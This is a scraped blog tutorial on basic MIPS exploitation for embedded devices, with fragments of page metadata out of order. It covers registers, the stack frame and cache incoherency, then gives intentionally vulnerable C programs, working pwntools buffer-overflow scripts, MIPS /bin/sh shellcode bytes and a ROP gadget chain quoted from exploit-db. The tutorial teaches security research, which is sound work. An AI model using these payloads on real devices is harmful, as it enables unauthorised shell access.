+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Hack.lu 2019 - no_risc_no_future&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HackCTF - BabyMIPS&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;RISC architectures like MIPS are unfamiliar at first, but once you get used to the exploitation tips and tricks specific to the architecture&amp;#x2019;s characteristics, they seem quite manageable! I hope this has been of some help to those who are new to MIPS exploitation!&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll be back with another embedded topic next time! Thank you! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Research] Exploitation basic in MIPS (EN) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image1.jpg&#34; alt=&#34;image1.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you get into embedded hacking, you encounter binaries and environments from various RISC architectures.&lt;/p&gt;
+&lt;p&gt;Most of the time, you&amp;#x2019;ll work with and see the ARM architecture. However, it&amp;#x2019;s also not uncommon to come across MIPS and MIPSEL architectures&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;The assembly instructions and registers look unfamiliar from the start, and to top it off, you have to worry about the Cache&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s cover the most fundamental aspects needed for exploitation in this somewhat alien MIPS environment!&lt;/p&gt;
+&lt;h2 id=&#34;1-MIPS-vs-MIPSEL&#34;&gt;&lt;a href=&#34;#1-MIPS-vs-MIPSEL&#34; class=&#34;headerlink&#34; title=&#34;1. MIPS vs MIPSEL&#34;&gt;&lt;/a&gt;1. MIPS vs MIPSEL&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image2.jpg&#34; alt=&#34;image2.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;MIPS is one of the RISC architectures designed so that registers and instructions perform a single role. Although it has the disadvantage of having many registers, its instructions are simple, leading to low power consumption, which is why it&amp;#x2019;s primarily used in embedded devices.&lt;/p&gt;
+&lt;p&gt;Because the MIPS instruction set is so cleanly organized, it&amp;#x2019;s often the architecture taught in university computer architecture courses (that was the case for me)&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;MIPS is big-endian, while MIPSEL is little-endian. MIPSEL only adopts the little-endian data storage format, so it operates in the same way as MIPS. Since the commonly used x86-64 architecture also uses this data storage method, you can use pwntools functions in the same way for MIPSEL. Therefore, in a MIPSEL environment, you can use pwntools&amp;#x2019; &lt;code&gt;p32()&lt;/code&gt; and &lt;code&gt;p64()&lt;/code&gt; functions as they are!&lt;/p&gt;
+&lt;h2 id=&#34;2-MIPS-Stack-amp-Register&#34;&gt;&lt;a href=&#34;#2-MIPS-Stack-amp-Register&#34; class=&#34;headerlink&#34; title=&#34;2. MIPS Stack &amp;amp; Register&#34;&gt;&lt;/a&gt;2. MIPS Stack &amp;amp; Register&lt;/h2&gt;&lt;p&gt;Before we dive into exploitation, it&amp;#x2019;s necessary to understand the stack structure and behavior in a MIPS environment.&lt;/p&gt;
+&lt;p&gt;The official references for the MIPS architecture are &lt;a href=&#34;https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf&#34;&gt;MIPS32 Architecture For Programmers Volume I&lt;/a&gt; and the &lt;a href=&#34;https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf&#34;&gt;MIPS Assembly Language Programmer&amp;#x2019;s Guide&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;From these, let&amp;#x2019;s cover the knowledge we need from an exploitation perspective. First, here is a list of registers used in MIPS and their roles.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&amp;#xC774;&amp;#xB984;&lt;/th&gt;
+&lt;th&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBC88;&amp;#xD638;&lt;/th&gt;
+&lt;th&gt;&amp;#xC5ED;&amp;#xD560;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$zero&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$0&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Always returns 0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$at&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Reserved for assembler to calculate pseudo-instructions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$v0&lt;/code&gt; ~ &lt;code&gt;$v1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$2&lt;/code&gt; ~ &lt;code&gt;$3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores values returned from functions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$a0&lt;/code&gt; ~ &lt;code&gt;$a3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$4&lt;/code&gt; ~ &lt;code&gt;$7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores function arguments&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t0&lt;/code&gt; ~ &lt;code&gt;$t7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$8&lt;/code&gt; ~ &lt;code&gt;$15&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used for temporary value storage by the assembler or language&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$s0&lt;/code&gt; ~ &lt;code&gt;$s7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$16&lt;/code&gt; ~ &lt;code&gt;$23&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used to store long-lasting values (callee-saved)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t8&lt;/code&gt; ~ &lt;code&gt;$t9&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$24&lt;/code&gt; ~ &lt;code&gt;$25&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used for temporary value storage by the assembler or language&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$k0&lt;/code&gt; ~ &lt;code&gt;$k1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$26&lt;/code&gt; ~ &lt;code&gt;$27&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Reserved for the OS kernel&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$gp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$28&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the global pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$sp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$29&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the stack pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$fp&lt;/code&gt;/&lt;code&gt;$s8&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$30&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the frame pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$ra&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$31&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the return address&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;The registers to pay close attention to are &lt;code&gt;$ra&lt;/code&gt;, &lt;code&gt;$sp&lt;/code&gt;, and &lt;code&gt;$s8&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In MIPS, the &lt;code&gt;$ra&lt;/code&gt; register holds the function&amp;#x2019;s return address. It&amp;#x2019;s helpful to think of it as serving the role of &lt;code&gt;RET&lt;/code&gt; in x86/x64.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400734 &amp;lt;main+0&amp;gt;:    addiu   sp,sp,-136
+0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)
+0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
+0x00400740 &amp;lt;main+12&amp;gt;:   move    s8,sp
+...
+0x004007d8 &amp;lt;main+164&amp;gt;:  move    sp,s8
+0x004007dc &amp;lt;main+168&amp;gt;:  lw      ra,132(sp)
+0x004007e0 &amp;lt;main+172&amp;gt;:  lw      s8,128(sp)
+0x004007e4 &amp;lt;main+176&amp;gt;:  addiu   sp,sp,136
+0x004007e8 &amp;lt;main+180&amp;gt;:  jr      ra&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The structure works by saving the return address from the &lt;code&gt;$ra&lt;/code&gt; register onto the stack during the function prologue and then jumping to the return address in the &lt;code&gt;$ra&lt;/code&gt; register during the function epilogue.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;$ra&lt;/code&gt; register&amp;#x2019;s value is saved to the stack relative to the &lt;code&gt;$sp&lt;/code&gt; (current stack pointer) and &lt;code&gt;$s8&lt;/code&gt; (frame pointer). Therefore, the first step in stack-based exploitation is to calculate the offset by determining the buffer&amp;#x2019;s starting position and the return address&amp;#x2019;s location relative to the &lt;code&gt;$sp&lt;/code&gt; register.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;lw      $s2, 24(sp)      ; Load value at sp+24 into $s2 (address of &amp;amp;&amp;quot;/bin/sh&amp;quot;)
+lw      $s1, 20(sp)      ; Load value at sp+20 into $s1 (address of &amp;amp;system)
+lw      $s0, 16(sp)      ; Load value at sp+16 into $s0 (address of &amp;amp;sleep)
+lw      $ra, 28(sp)      ; Load value at sp+28 into $ra (address of the next gadget)
+addiu   sp, sp, 32       ; Clean up the stack pointer
+jr      $ra              ; Jump to $ra (the next gadget)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The gadget form needed for the Shellcode and ROP chains, which will be explained later, is shown above.&lt;/p&gt;
+&lt;p&gt;The most basic form involves loading values from the stack into the &lt;code&gt;$s0-$s7&lt;/code&gt; registers using the &lt;code&gt;lw&lt;/code&gt; instruction, cleaning up the stack pointer with &lt;code&gt;addiu&lt;/code&gt;, and then jumping to the return address with &lt;code&gt;jr&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since this is the most basic form, you can combine the necessary arguments and instructions to fit the specific situation and environment.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;move    $t9, $s1         ; Move $s1 (system address) to $t9 (register for calls)
+jalr    $t9              ; Jump to the address in $t9&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Function execution is performed via the &lt;code&gt;jalr&lt;/code&gt; instruction. You can understand it as working like the call instruction in x86-64.&lt;/p&gt;
+&lt;h2 id=&#34;3-Cache-Incoherency&#34;&gt;&lt;a href=&#34;#3-Cache-Incoherency&#34; class=&#34;headerlink&#34; title=&#34;3. Cache Incoherency&#34;&gt;&lt;/a&gt;3. Cache Incoherency&lt;/h2&gt;&lt;p&gt;When exploiting a real device configured with a MIPS environment, you&amp;#x2019;ll sometimes need to use shellcode due to the nature of IoT/embedded devices. However, there&amp;#x2019;s a crucial point to be aware of when using shellcode in a MIPS environment.&lt;/p&gt;
+&lt;p&gt;That is the Cache.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image3.png&#34; alt=&#34;image3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;MIPS uses two types of caches: the Instruction Cache, which holds opcodes, and the Data Cache, which records data.&lt;/p&gt;
+&lt;p&gt;The problem, known as Cache Incoherency, occurs because the value we input (our shellcode) goes into the Data Cache, but the CPU tries to execute instructions from the existing Instruction Cache.&lt;/p&gt;
+&lt;p&gt;To solve this, we need to bring the data from the Data Cache to the Instruction Cache. This process, depending on the cache write policy, involves synchronizing with memory and then invalidating the Instruction Cache. The important part here is that we need to flush the Data Cache to force a cache write.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image4.png&#34; alt=&#34;image4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The state of memory and the caches after the Data Cache has been flushed is shown above. Since the instructions in the Instruction Cache and memory are no longer identical, the Instruction Cache is invalidated. Then, the code from the Data Cache, now synchronized with memory, is executed.&lt;/p&gt;
+&lt;p&gt;Only by going through this process can we create a flow where the shellcode we&amp;#x2019;ve inserted can actually be executed.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image5.png&#34; alt=&#34;image5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The easiest way to achieve this is by calling the &lt;code&gt;sleep()&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;When &lt;code&gt;sleep()&lt;/code&gt; is called, execution is passed to another process or thread, causing other data to be generated in the Data Cache. Later, according to the cache write policy, a flush occurs, and the data residing in memory is also written to the Data Cache.&lt;/p&gt;
+&lt;p&gt;Therefore, if you&amp;#x2019;re using shellcode in a MIPS environment, it&amp;#x2019;s a good practice to structure your exploit by calling &lt;code&gt;sleep()&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;4-MIPS-Exploit-Practice&#34;&gt;&lt;a href=&#34;#4-MIPS-Exploit-Practice&#34; class=&#34;headerlink&#34; title=&#34;4. MIPS Exploit Practice&#34;&gt;&lt;/a&gt;4. MIPS Exploit Practice&lt;/h2&gt;&lt;p&gt;Let&amp;#x2019;s practice exploitation in a MIPS environment with a simple example.&lt;/p&gt;
+&lt;h3 id=&#34;4-1-RTL&#34;&gt;&lt;a href=&#34;#4-1-RTL&#34; class=&#34;headerlink&#34; title=&#34;4-1: RTL&#34;&gt;&lt;/a&gt;4-1: RTL&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
+}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
+        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We&amp;#x2019;ll practice finding the stack offset using a basic RTL in a MIPS environment. This example code creates a vulnerable function where a buffer overflow occurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)  ; ret
+0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
+0x00400740 &amp;lt;main+12&amp;gt;:	  move	  s8,sp
+...
+0x0040079c &amp;lt;main+104&amp;gt;:	addiu	  v0,s8,24  ; buf
+0x004007a0 &amp;lt;main+108&amp;gt;:	move	  a1,v0
+...
+0x004007b0 &amp;lt;main+124&amp;gt;:	jalr	  t9  ; scanf&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By checking the assembly with gdb, we can find the following offsets:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Return address: sp + 132&lt;br&gt;We can see that the value in the $ra register, which holds the return address, is stored at sp+132.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Buffer start: sp + 24&lt;br&gt;We can see that the argument for scanf() involves the operation s8 + 24 (and s8 was set to sp).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Therefore, the offset is 132 - 24 = 108.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)
+
+sh = &lt;span class=&#34;hljs-number&#34;&gt;0x4006e0&lt;/span&gt;
+
+pay = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;
+pay += p32(sh)
+
+p.sendline(pay)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image6.png&#34; alt=&#34;image6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After writing the exploit code with the correct offset and running it, we can confirm that it works perfectly.&lt;/p&gt;
+&lt;h3 id=&#34;4-2-shellcode&#34;&gt;&lt;a href=&#34;#4-2-shellcode&#34; class=&#34;headerlink&#34; title=&#34;4-2: shellcode&#34;&gt;&lt;/a&gt;4-2: shellcode&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;buf: %p\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is an example of using shellcode while considering the Cache Incoherency issue in MIPS that we discussed earlier. This is also a buffer overflow vulnerable code, built with NX disabled.&lt;/p&gt;
+&lt;p&gt;The return address offset is the same as in the previous problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image7.png&#34; alt=&#34;image7.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Additionally, I used an address within &lt;code&gt;__libc_csu_init&lt;/code&gt; for the stack-cleaning gadget.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time
+
+p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)
+
+sh = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&amp;quot;&lt;/span&gt;
+
+sleep_addr = &lt;span class=&#34;hljs-number&#34;&gt;0x00400970&lt;/span&gt;
+gadget = &lt;span class=&#34;hljs-number&#34;&gt;0x00400824&lt;/span&gt;
+
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;buf: &amp;quot;&lt;/span&gt;)
+addr = int(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+
+log.success(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addr is {}&amp;quot;&lt;/span&gt;.format(hex(addr)))
+
+pay = sh
+pay += &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * (&lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt; - len(sh))
+pay += p32(sleep_addr)
+pay += p32(gadget)
+pay += p32(addr)
+
+time.sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)
+p.sendline(pay)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The most basic approach is to call the &lt;code&gt;sleep()&lt;/code&gt; function, followed by a stack-cleaning gadget, and then jump to the shellcode address. The shellcode is for MIPS.&lt;/p&gt;
+&lt;p&gt;In a real-world scenario, using shellcode would also require a libc base leak and gadget calls to invoke &lt;code&gt;sleep()&lt;/code&gt;, which means you would be performing a ROP attack. You can refer to the link below!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48994&#34;&gt;https://www.exploit-db.com/exploits/48994&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;First ROP (sleep_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x0004c974&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab2e974&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c97c&lt;/span&gt;      move    t9, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c980&lt;/span&gt;      lw      ra, (var_1ch)
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c984&lt;/span&gt;      lw      s0, (var_18h)
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c988&lt;/span&gt;      addiu   a0, zero, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; ; arg1
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c98c&lt;/span&gt;      addiu   a1, zero, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; ; arg2
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c990&lt;/span&gt;      move    a2, zero
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c994&lt;/span&gt;      jr      t9
+
+Second ROP (stack_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab1bfa8&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt;      addiu   s0, sp, &lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fac&lt;/span&gt;      move    a0, s3
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb0&lt;/span&gt;      move    a1, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb4&lt;/span&gt;      move    t9, s1
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb8&lt;/span&gt;      jalr    t9
+
+Third ROP (call_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab226d8&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt;      move    t9, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x000406dc&lt;/span&gt;      jalr    t9
+
+payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;160&lt;/span&gt; + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here are the ROP gadgets and payload section used in that link.&lt;/p&gt;
